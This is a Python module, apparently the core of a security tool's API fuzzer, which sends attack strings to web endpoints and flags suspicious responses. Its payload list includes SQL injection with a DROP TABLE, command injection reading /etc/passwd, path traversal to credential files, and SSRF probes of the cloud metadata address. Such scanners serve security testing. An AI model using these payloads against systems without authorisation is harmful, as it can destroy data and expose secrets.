"""API fuzzer core engine."""

from __future__ import annotations

import asyncio
import logging
import random
import string
from dataclasses import dataclass, field
from typing import Any

import httpx

from sentinel.core.exceptions import AnalysisError

logger = logging.getLogger(__name__)

FUZZ_PAYLOADS = {
    "sqli": [
        "' OR '1'='1", "' OR '1'='1' --", "1; DROP TABLE users--",
        "' UNION SELECT NULL--", "admin'--", "1' AND '1'='1",
    ],
    "xss": [
        "<script>alert(1)</script>", "\"><script>alert(1)</script>",
        "javascript:alert(1)", "<img src=x onerror=alert(1)>",
    ],
    "path_traversal": [
        "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//etc/passwd",
    ],
    "ssrf": [
        "http://127.0.0.1", "http://localhost", "http://169.254.169.254/latest/meta-data/",
        "http://[::1]", "http://0.0.0.0",
    ],
    "command_injection": [
        "; ls -la", "| whoami", "$(cat /etc/passwd)", "`id`",
        "& dir", "|| cat /etc/passwd",
    ],
    "nosql": [
        '{"$gt": ""}', '{"$ne": null}', '{"$where": "1==1"}',
        '{"$regex": ".*"}',
    ],
}


@dataclass
class FuzzResult:
    """Result of a fuzzing operation."""

    endpoint: str
    method: str
    payload_type: str
    payload: str
    status_code: int = 0
    response_time: float = 0.0
    response_length: int = 0
    interesting: bool = False
    evidence: str = ""
    error: str = ""


class APIFuzzer:
    """Fuzzes API endpoints with various attack payloads."""

    def __init__(self, base_url: str, timeout: int = 10) -> None:
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self._results: list[FuzzResult] = []
        self._discovered_endpoints: list[dict[str, str]] = []

    async def fuzz_endpoint(
        self,
        method: str,
        path: str,
        params: dict[str, str] | None = None,
        headers: dict[str, str] | None = None,
        cookies: dict[str, str] | None = None,
        payload_types: list[str] | None = None,
    ) -> list[FuzzResult]:
        """Fuzz a single endpoint with various payloads."""
        results = []
        types = payload_types or list(FUZZ_PAYLOADS.keys())

        for ptype in types:
            payloads = FUZZ_PAYLOADS.get(ptype, [])
            for payload in payloads:
                result = await self._send_fuzz(
                    method, path, payload, ptype, params, headers, cookies
                )
                results.append(result)
                self._results.append(result)

        return results

    async def fuzz_all_endpoints(
        self,
        endpoints: list[dict[str, Any]],
        headers: dict[str, str] | None = None,
        cookies: dict[str, str] | None = None,
    ) -> list[FuzzResult]:
        """Fuzz all discovered endpoints."""
        all_results = []
        for ep in endpoints:
            method = ep.get("method", "GET")
            path = ep.get("path", "")
            params = ep.get("params", {})
            results = await self.fuzz_endpoint(method, path, params, headers, cookies)
            all_results.extend(results)
        return all_results

    async def _send_fuzz(
        self,
        method: str,
        path: str,
        payload: str,
        payload_type: str,
        params: dict[str, str] | None,
        headers: dict[str, str] | None,
        cookies: dict[str, str] | None,
    ) -> FuzzResult:
        """Send a single fuzzed request."""
        url = f"{self.base_url}{path}"
        result = FuzzResult(
            endpoint=path, method=method,
            payload_type=payload_type, payload=payload,
        )

        try:
            async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
                # Fuzz parameters
                fuzz_params = dict(params) if params else {}
                fuzz_params["fuzz"] = payload

                request_headers = dict(headers) if headers else {}
                request_cookies = dict(cookies) if cookies else {}

                import time
                start = time.monotonic()

                resp = await client.request(
                    method=method,
                    url=url,
                    params=fuzz_params if method == "GET" else None,
                    json={"data": payload} if method in ("POST", "PUT", "PATCH") else None,
                    headers=request_headers,
                    cookies=request_cookies,
                    follow_redirects=True,
                )

                result.status_code = resp.status_code
                result.response_time = time.monotonic() - start
                result.response_length = len(resp.content)

                # Check for interesting responses
                if resp.status_code == 200:
                    body = resp.text.lower()
                    indicators = [
                        "error", "exception", "stack trace", "sql",
                        "syntax", "warning", "root:", "uid=",
                        "admin", "password", "secret", "token",
                    ]
                    matched = [i for i in indicators if i in body]
                    if matched:
                        result.interesting = True
                        result.evidence = f"Indicators found: {', '.join(matched)}"

                elif resp.status_code in (500, 502, 503):
                    result.interesting = True
                    result.evidence = f"Server error: {resp.status_code}"

                elif resp.status_code in (401, 403):
                    result.interesting = False  # Auth working = good

                elif resp.status_code == 301 or resp.status_code == 302:
                    result.interesting = True
                    result.evidence = f"Redirect: {resp.headers.get('location', 'unknown')}"

        except httpx.TimeoutException:
            result.error = "Timeout"
        except httpx.ConnectError:
            result.error = "Connection refused"
        except Exception as e:
            result.error = str(e)

        return result

    def get_results(self, interesting_only: bool = False) -> list[FuzzResult]:
        if interesting_only:
            return [r for r in self._results if r.interesting]
        return self._results

    def get_stats(self) -> dict[str, Any]:
        return {
            "total_requests": len(self._results),
            "interesting": sum(1 for r in self._results if r.interesting),
            "errors": sum(1 for r in self._results if r.error),
            "by_type": {
                t: sum(1 for r in self._results if r.payload_type == t)
                for t in set(r.payload_type for r in self._results)
            },
        }
